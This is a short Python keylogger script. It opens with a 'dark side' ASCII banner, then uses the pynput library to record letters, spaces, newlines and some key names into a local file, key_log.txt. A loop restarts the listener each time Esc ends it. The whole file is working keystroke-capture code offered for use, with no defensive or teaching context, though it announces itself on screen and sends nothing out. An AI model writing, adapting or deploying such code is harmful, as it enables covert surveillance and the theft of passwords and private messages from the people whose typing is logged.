from pynput import keyboard
import time
import os
log_file = "key_log.txt"

print("""
 ██████╗  █████╗ ███████╗███████╗██╗   ██╗    ██╗     ██╗ ██████╗ ███████╗██╗
██╔════╝ ██╔══██╗██╔════╝██╔════╝██║   ██║    ██║     ██║██╔═══██╗██╔════╝██║
██║  ███╗███████║███████╗█████╗  ██║   ██║    ██║     ██║██║   ██║███████╗██║
██║   ██║██╔══██║╚════██║██╔══╝  ██║   ██║    ██║     ██║██║   ██║╚════██║██║
╚██████╔╝██║  ██║███████║███████╗╚██████╔╝    ███████╗██║╚██████╔╝███████║██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝     ╚══════╝╚═╝ ╚═════╝ ╚══════╝╚═╝

                     *** WELCOME TO THE DARK SIDE ***
            Be warned... every keystroke will be watched closely.
            There’s no turning back now. Are you prepared?
""")

time.sleep(2)
os.system('cls')
print('Keylogger Listening....')
def on_press(key):
    try:
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.backspace:
                pass  
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif hasattr(key, 'char') and key.char is not None and key.char.isalpha():  
                file.write(f"{key.char}")
            else:
                pass 
    except AttributeError:  
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:  
        return False

while True:
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
